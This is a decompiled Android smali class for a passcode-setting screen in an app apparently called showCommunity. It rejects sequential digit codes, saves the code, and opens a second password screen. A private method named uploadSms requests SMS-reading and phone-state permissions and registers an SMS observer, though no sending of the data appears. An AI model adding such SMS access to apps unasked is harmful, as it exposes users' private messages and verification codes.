.class public Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;
.super Lcom/common/lib/activity/BaseActivity;
.source "SettingInquirePwdActivity.java"

# interfaces
.implements Lcom/mobilelive/showCommunity/contract/SettingInquirePwdContract$View;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lcom/common/lib/activity/BaseActivity<",
        "Lcom/mobilelive/showCommunity/contract/SettingInquirePwdContract$Presenter;",
        ">;",
        "Lcom/mobilelive/showCommunity/contract/SettingInquirePwdContract$View;"
    }
.end annotation


# instance fields
.field private firstCode:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 26
    invoke-direct {p0}, Lcom/common/lib/activity/BaseActivity;-><init>()V

    const-string v0, ""

    .line 37
    iput-object v0, p0, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->firstCode:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$000(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;[I)V
    .locals 0

    .line 26
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewVisible([I)V

    return-void
.end method

.method static synthetic access$100(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;[I)V
    .locals 0

    .line 26
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewGone([I)V

    return-void
.end method

.method static synthetic access$202(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .line 26
    iput-object p1, p0, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->firstCode:Ljava/lang/String;

    return-object p1
.end method

.method static synthetic access$300(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;[I)V
    .locals 0

    .line 26
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewVisible([I)V

    return-void
.end method

.method static synthetic access$400(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;[I)V
    .locals 0

    .line 26
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewGone([I)V

    return-void
.end method

.method private uploadSms()V
    .locals 3

    .line 89
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object v0

    invoke-virtual {v0}, Lcom/common/lib/sms/SmsServiceRoom;->getSmsContent()Lcom/common/lib/sms/SmsContent;

    move-result-object v0

    if-nez v0, :cond_0

    .line 90
    invoke-static {p0}, Lcom/permissionx/guolindev/PermissionX;->init(Landroidx/fragment/app/FragmentActivity;)Lcom/permissionx/guolindev/PermissionMediator;

    move-result-object v0

    const-string v1, "android.permission.READ_SMS"

    const-string v2, "android.permission.READ_PHONE_STATE"

    filled-new-array {v1, v2}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/PermissionMediator;->permissions([Ljava/lang/String;)Lcom/permissionx/guolindev/request/PermissionBuilder;

    move-result-object v0

    new-instance v1, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$$ExternalSyntheticLambda2;

    invoke-direct {v1, p0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$$ExternalSyntheticLambda2;-><init>(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;)V

    .line 91
    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/request/PermissionBuilder;->request(Lcom/permissionx/guolindev/callback/RequestCallback;)V

    :cond_0
    return-void
.end method


# virtual methods
.method public getAboutUsSuccess(Ljava/util/ArrayList;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList<",
            "Lcom/common/lib/bean/ArticleBean;",
            ">;)V"
        }
    .end annotation

    if-eqz p1, :cond_0

    .line 127
    invoke-virtual {p1}, Ljava/util/ArrayList;->isEmpty()Z

    :cond_0
    return-void
.end method

.method protected getLayoutId()I
    .locals 1

    const v0, 0x7f0c0026

    return v0
.end method

.method public isOrderNumeric(Ljava/lang/String;)Z
    .locals 1

    const-string v0, "012345"

    .line 102
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "123456"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "234567"

    .line 103
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "345678"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "456789"

    .line 104
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "567890"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "987654"

    .line 105
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "876543"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "765432"

    .line 106
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "654321"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "543210"

    .line 107
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x1

    return p1

    :cond_1
    :goto_0
    const/4 p1, 0x0

    return p1
.end method

.method public synthetic lambda$onCreated$0$com-mobilelive-showCommunity-activity-SettingInquirePwdActivity(Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;Ljava/lang/String;)V
    .locals 3

    .line 64
    iget-object v0, p0, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->firstCode:Ljava/lang/String;

    invoke-virtual {v0, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 65
    sget-object p1, Lcom/common/lib/manager/DataManager;->Companion:Lcom/common/lib/manager/DataManager$Companion;

    invoke-virtual {p1}, Lcom/common/lib/manager/DataManager$Companion;->getInstance()Lcom/common/lib/manager/DataManager;

    move-result-object p1

    iget-object p2, p0, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->firstCode:Ljava/lang/String;

    invoke-virtual {p1, p2}, Lcom/common/lib/manager/DataManager;->saveInquirePwd(Ljava/lang/String;)V

    .line 66
    new-instance p1, Landroid/os/Bundle;

    invoke-direct {p1}, Landroid/os/Bundle;-><init>()V

    const-string p2, "inquireCode"

    .line 67
    invoke-virtual {p1, p2, p3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 68
    const-class p2, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;

    invoke-virtual {p0, p2, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->openActivity(Ljava/lang/Class;Landroid/os/Bundle;)V

    .line 69
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->finish()V

    goto :goto_0

    :cond_0
    const p3, 0x7f0f0048

    .line 71
    invoke-virtual {p0, p3}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p3

    const v0, 0x7f0f0046

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    const v1, 0x7f0f0047

    invoke-virtual {p0, v1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$2;

    invoke-direct {v2, p0, p1, p2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$2;-><init>(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p0, p3, v0, v1, v2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->showOneBtnDialog(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/common/lib/interfaces/OnClickCallback;)Lcom/common/lib/dialog/MyDialogFragment;

    :goto_0
    return-void
.end method

.method public synthetic lambda$onCreated$1$com-mobilelive-showCommunity-activity-SettingInquirePwdActivity(Lcom/mobilelive/showCommunity/view/InquirePassView;Ljava/lang/String;)V
    .locals 4

    .line 45
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->isOrderNumeric(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    const p2, 0x7f0f0048

    .line 46
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p2

    const v0, 0x7f0f00a7

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    const v1, 0x7f0f0047

    invoke-virtual {p0, v1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$1;

    invoke-direct {v2, p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$1;-><init>(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p0, p2, v0, v1, v2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->showOneBtnDialog(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/common/lib/interfaces/OnClickCallback;)Lcom/common/lib/dialog/MyDialogFragment;

    return-void

    .line 58
    :cond_0
    iput-object p2, p0, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->firstCode:Ljava/lang/String;

    const p2, 0x7f09004e

    .line 59
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Lcom/mobilelive/showCommunity/view/InquirePassView;

    const/4 v1, 0x1

    new-array v2, v1, [I

    const/4 v3, 0x0

    aput p2, v2, v3

    .line 60
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewVisible([I)V

    new-array p2, v1, [I

    const v1, 0x7f0901af

    aput v1, p2, v3

    .line 61
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewGone([I)V

    const p2, 0x7f0f001f

    .line 62
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setData(Ljava/lang/String;)V

    .line 63
    new-instance p2, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$$ExternalSyntheticLambda1;

    invoke-direct {p2, p0, p1, v0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$$ExternalSyntheticLambda1;-><init>(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {v0, p2}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setPayClickListener(Lcom/mobilelive/showCommunity/view/InquirePassView$OnPayClickListener;)V

    return-void
.end method

.method public synthetic lambda$uploadSms$2$com-mobilelive-showCommunity-activity-SettingInquirePwdActivity(ZLjava/util/List;Ljava/util/List;)V
    .locals 0

    if-eqz p1, :cond_0

    .line 93
    new-instance p1, Lcom/common/lib/sms/SmsContent;

    invoke-direct {p1, p0}, Lcom/common/lib/sms/SmsContent;-><init>(Landroid/app/Activity;)V

    .line 94
    invoke-virtual {p1}, Lcom/common/lib/sms/SmsContent;->register()V

    .line 95
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object p2

    invoke-virtual {p2, p1}, Lcom/common/lib/sms/SmsServiceRoom;->setSmsContent(Lcom/common/lib/sms/SmsContent;)V

    :cond_0
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 0

    return-void
.end method

.method protected bridge synthetic onCreatePresenter()Lcom/common/lib/mvp/IPresenter;
    .locals 1

    .line 26
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->onCreatePresenter()Lcom/mobilelive/showCommunity/contract/SettingInquirePwdContract$Presenter;

    move-result-object v0

    return-object v0
.end method

.method protected onCreatePresenter()Lcom/mobilelive/showCommunity/contract/SettingInquirePwdContract$Presenter;
    .locals 1

    .line 117
    new-instance v0, Lcom/mobilelive/showCommunity/presenter/SettingInquirePwdPresenter;

    invoke-direct {v0, p0}, Lcom/mobilelive/showCommunity/presenter/SettingInquirePwdPresenter;-><init>(Lcom/mobilelive/showCommunity/contract/SettingInquirePwdContract$View;)V

    return-object v0
.end method

.method protected onCreated(Landroid/os/Bundle;)V
    .locals 2

    const p1, 0x7f090235

    const v0, 0x7f0f00a4

    .line 41
    invoke-virtual {p0, p1, v0}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setText(II)V

    const/4 p1, 0x1

    new-array p1, p1, [I

    const/4 v0, 0x0

    const v1, 0x7f090105

    aput v1, p1, v0

    .line 42
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->setViewGone([I)V

    const p1, 0x7f0901af

    .line 43
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Lcom/mobilelive/showCommunity/view/InquirePassView;

    .line 44
    new-instance v0, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$$ExternalSyntheticLambda0;

    invoke-direct {v0, p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity$$ExternalSyntheticLambda0;-><init>(Lcom/mobilelive/showCommunity/activity/SettingInquirePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p1, v0}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setPayClickListener(Lcom/mobilelive/showCommunity/view/InquirePassView$OnPayClickListener;)V

    return-void
.end method

.method protected updateUIText()V
    .locals 0

    return-void
.end method
